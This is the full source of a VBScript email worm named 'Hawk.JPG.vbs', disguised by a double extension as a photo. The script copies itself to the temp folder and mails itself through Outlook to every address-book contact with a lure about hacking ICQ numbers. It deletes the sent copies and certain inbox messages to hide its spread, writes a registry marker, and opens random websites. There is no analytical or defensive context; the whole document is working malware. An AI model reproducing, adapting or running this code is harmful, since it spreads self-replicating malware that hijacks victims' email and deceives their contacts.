On Error Resume Next
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Folder=FSO.GetSpecialFolder(2)

Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"\Hawk.JPG.vbs",2,true)
OutF.write ScriptBuffer
OutF.close
Set FSO=Nothing

If WS.regread ("HKCU\software\An\mailed") <> "1" then
Mailit()
End If

Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="I am HAWK (UIN HUNTER)!" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="I AM HAWK" Then
u.Items.Item(i).delete
End If
Next

Randomize
r=Int((4*Rnd)+1)
If r=1 then
WS.Run("http://www.president.gov.by")
elseif r=2 Then
WS.Run("http://www.icq.com")
elseif r=3 Then
WS.Run("http://www.president.gov.by")
ElseIf r=4 Then
WS.Run("http://www.microsoft.com")
End If

Function Mailit()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
	Set Mapi=Outlook.GetNameSpace("MAPI")
	Set Lists=Mapi.AddressLists
	For Each ListIndex In Lists
		If ListIndex.AddressEntries.Count <> 0 Then
			ContactCount = ListIndex.AddressEntries.Count
			For Count= 1 To ContactCount
				Set Mail = Outlook.CreateItem(0)
				Set Contact = ListIndex.AddressEntries(Count)
				Mail.To = Contact.Address
				Mail.Subject = "I am Hawk! I am hacking ICQ UINS!:)"
				Mail.Body = vbcrlf&"Hi!"&vbcrlf&vbcrlf&"I am Hawk! Hawk.JPG.vbs is my photo! I am UIN Hunter! If u want short ICQ number, contact me! ICQ 807570"&vbcrlf&vbcrlf
				Set Attachment=Mail.Attachments
				Attachment.Add Folder & "\Hawk.JPG.vbs"
				Mail.DeleteAfterSubmit = True
				If Mail.To <> "" Then
				Mail.Send
				WS.regwrite "HKCU\software\An\mailed", "1"
			End If
			Next
		End If
	Next
End if
End Function
